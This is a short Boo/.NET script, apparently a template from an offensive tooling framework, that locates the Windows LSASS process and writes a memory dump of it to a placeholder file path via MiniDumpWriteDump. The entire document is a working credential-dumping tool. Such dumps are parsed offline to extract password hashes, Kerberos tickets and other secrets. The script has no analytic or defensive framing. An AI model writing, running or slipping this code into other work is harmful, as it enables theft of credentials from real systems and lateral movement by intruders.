import System.Runtime.InteropServices
from System.Diagnostics import Process
from System.IO import FileStream, FileMode, FileAccess,FileShare

[DllImport("Dbghelp.dll", EntryPoint:"MiniDumpWriteDump")]
def minidumpwritedump(hProcess as int, ProcessId as int, hFile as int, DumpType as int, ExceptionParam as int, UserStreamParam as int, CallbackParam as int):
    pass

procname = 'lsass'
ids = Process.GetProcessesByName(procname)
for pid in ids:
    file = "DUMPFILE_PATH"
    using fs = FileStream(file, FileMode.Create, FileAccess.ReadWrite, FileShare.Write):
        minidumpwritedump(pid.Handle, pid.Id, fs.Handle,0x00000002,0,0,0)

output = "Dumped to $file"
